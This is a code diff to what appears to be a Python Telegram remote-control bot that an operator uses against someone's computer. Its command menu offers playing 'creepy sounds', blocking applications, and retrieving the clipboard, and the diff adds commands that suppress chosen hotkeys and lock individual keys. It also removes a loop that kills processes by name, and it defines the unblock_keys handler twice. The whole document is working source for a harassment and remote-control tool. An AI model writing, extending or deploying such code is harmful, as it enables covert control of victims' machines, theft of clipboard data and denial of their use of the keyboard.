@@ -81,8 +81,10 @@ def send_welcome(message):
         "/sound - Play creepy sounds\n"
         "/block_app - Block a specific application\n"
         "/stop_blocking_app - Unblock all applications\n"
-        "/block_keys - Block specific keys\n"
-        "/unblock_keys - Unblock all keys\n"
+        "/block_keys - Block specific Hotkeys\n"
+        "/unblock_keys - Unblock all Hotkeys\n"
+        "/block_keys_kb - Block specific keys\n"
+        "/unblock_keys_kb - Unblock all keys\n"
         "/buffer - Retrieve the computer's buffer information\n"
     )
     
@@ -101,53 +103,91 @@ def unblock_keys(message):
 
 blocking_thread = None
 blocking_active = False
+keys_to_block = []
+hotkeys_to_block = []
 
 @bot.message_handler(commands=['block_keys'])
 def block_keys(message):
-    global blocking_thread, blocking_active
-    args = message.text.split(' ')
+    global blocking_active, hotkeys_to_block
+
+    args = message.text.split(' ', 1)
     if len(args) < 2:
-        bot.send_message(message.chat.id, "Usage: /block_keys keys")
-        return
-    
-    keys_to_block = args[1]
-    if blocking_active:
-        bot.send_message(message.chat.id, "Keys are already being blocked.")
+        bot.send_message(message.chat.id, "Usage: /block_keys hotkey1;hotkey2")
         return
 
+    if blocking_active:
+        bot.send_message(message.chat.id, "Hotkeys are already blocked.")
+        return
+
+    hotkeys_to_block = args[1].split(';')
     blocking_active = True
 
-    def block_keys_thread():
+    def block_hotkeys_thread():
         try:
-            kb.add_hotkey(keys_to_block, lambda: None, suppress=True)
-            bot.send_message(message.chat.id, f"Blocking keys: {keys_to_block}")
+            for hotkey in hotkeys_to_block:
+                kb.add_hotkey(hotkey, lambda: None, suppress=True)
+            bot.send_message(message.chat.id, f"Hotkeys are locked:: {', '.join(hotkeys_to_block)}. Use /unblock_keys to unblock it.")
             while blocking_active:
                 time.sleep(1)
         except Exception as e:
-            bot.send_message(message.chat.id, f"Error in blocking keys: {e}")
+            bot.send_message(message.chat.id, f"Error when locking hotkeys: {e}")
 
-    threading.Thread(target=block_keys_thread, daemon=True).start()
+    threading.Thread(target=block_hotkeys_thread, daemon=True).start()
 
 @bot.message_handler(commands=['unblock_keys'])
 def unblock_keys(message):
-    global blocking_active
+    global blocking_active, hotkeys_to_block
+
     if not blocking_active:
-        bot.send_message(message.chat.id, "No keys are currently being blocked.")
+        bot.send_message(message.chat.id, "Hotkeys are not blocked.")
         return
-    
+
     blocking_active = False
     kb.clear_all_hotkeys() 
-    bot.send_message(message.chat.id, "Key blocking stopped.")
+    hotkeys_to_block = []
+    bot.send_message(message.chat.id, "Hotkeys unlocked.")
 
-start_app_block = True
+@bot.message_handler(commands=['block_keys_kb'])
+def block_keys_kb(message):
+    global blocking_thread, blocking_active, keys_to_block
 
-def block_keys(app_name):
-    global start_app_block
-    while start_app_block:
-        for proc in psutil.process_iter(['name']):
-            if proc.info['name'] == app_name:  
-                proc.kill() 
-        time.sleep(0.5)
+    args = message.text.split(' ', 1)
+    if len(args) < 2:
+        bot.send_message(message.chat.id, "Usage: /block_keys_kb a;b;c")
+        return
+    if blocking_active:
+        bot.send_message(message.chat.id, "The keys are already locked.")
+        return
+
+    keys_to_block = args[1].split(';')
+    blocking_active = True
+
+    def block_selected_keys():
+        try:
+            for key in keys_to_block:
+                kb.block_key(key)
+            bot.send_message(message.chat.id, f"Key lock: {', '.join(keys_to_block)}. Use /unblock_keys to unblock it.")
+            while blocking_active:
+                time.sleep(1)
+        except Exception as e:
+            bot.send_message(message.chat.id, f"Key lock error: {e}")
+
+    blocking_thread = threading.Thread(target=block_selected_keys, daemon=True)
+    blocking_thread.start()
+
+@bot.message_handler(commands=['unblock_keys'])
+def unblock_keys(message):
+    global blocking_active, keys_to_block
+
+    if not blocking_active:
+        bot.send_message(message.chat.id, "The keys are not locked.")
+        return
+
+    blocking_active = False
+    for key in keys_to_block:
+        kb.unblock_key(key)
+    keys_to_block = [] 
+    bot.send_message(message.chat.id, "Keys unlocked.")
 
 @bot.message_handler(commands=['block_app'])
 def block_task_manager(message):
